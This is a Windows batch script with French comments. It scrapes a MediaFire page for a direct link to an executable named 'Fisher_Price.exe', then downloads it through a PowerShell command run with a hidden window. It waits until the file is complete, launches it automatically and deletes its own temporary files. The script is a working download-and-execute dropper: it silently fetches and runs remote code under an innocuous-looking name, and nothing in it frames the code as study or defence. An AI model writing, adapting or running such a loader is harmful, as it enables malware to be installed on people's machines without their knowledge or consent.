@echo off

REM Définition des noms de fichiers
set "page_content=page_content.txt"
set "download_link=download_link.txt"
set "link_between_quotes=link_between_quotes.bat"
set "temp_link=temp_link.bat"

REM Nettoyage des fichiers temporaires
if exist "%page_content%" del "%page_content%"
if exist "%link_between_quotes%" del "%link_between_quotes%"
if exist "%download_link%" del "%download_link%"
if exist "%temp_link%" del "%temp_link%"

REM Lien de la page MediaFire
set "url=https://www.mediafire.com/file/975n5w51pta3zfb/Fisher_Price.exe"

REM Téléchargement de la page
curl "%url%" > "%page_content%"

REM Extraction du lien de téléchargement du contenu de la page
findstr /R /C:"href=\"https:\/\/.*download.*mediafire\.com.*\.exe\"" "%page_content%" > "%download_link%"

REM Lecture du lien de téléchargement dans une variable externe
for /F "tokens=2 delims==\" %%a in (%download_link%) do (
    set "download_link_content=%%~a"
    goto :found
)

:found
REM Affichage et utilisation du lien de téléchargement
echo Lien de téléchargement : %download_link_content%

REM Extraction du lien entre les guillemets doubles du contenu du fichier download_link.txt
powershell -Command "$content = Get-Content '%download_link%' -Raw; $link = [regex]::Match($content, 'href=\"(.*?)\"').Groups[1].Value; Set-Content -Path '%link_between_quotes%' -Value $link"

REM Stockage du contenu du fichier link_between_quotes.bat dans une variable externe
set /p link_content=<"%link_between_quotes%"

REM Récupérer le dernier segment du lien de téléchargement après le dernier "/"
for /F "tokens=* delims=/" %%A in ("%link_content%") do (
    set "last_segment=%%~nxA"
)
set "double_quote=""""

REM Ajout de mots au début et à la fin du fichier link_between_quotes.bat
echo powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri %link_content% -OutFile %last_segment% > "%temp_link%"

REM Remplacement du fichier d'origine par le fichier modifié
move /Y "%temp_link%" "%link_between_quotes%" > nul

REM Nettoyage des fichiers temporaires
if exist "%page_content%" del "%page_content%"
if exist "%download_link%" del "%download_link%"
if exist "%temp_link%" del "%temp_link%"

start "" "%link_between_quotes%"

:waitloop
timeout /t 5 /nobreak >nul

REM Tentative de renommer le fichier
ren "%last_segment%" "%last_segment%" 2>nul
if %errorlevel% neq 0 (
    goto :waitloop
) else (
    REM Le fichier est accessible, donc terminé de télécharger
    start "" "%last_segment%"
)
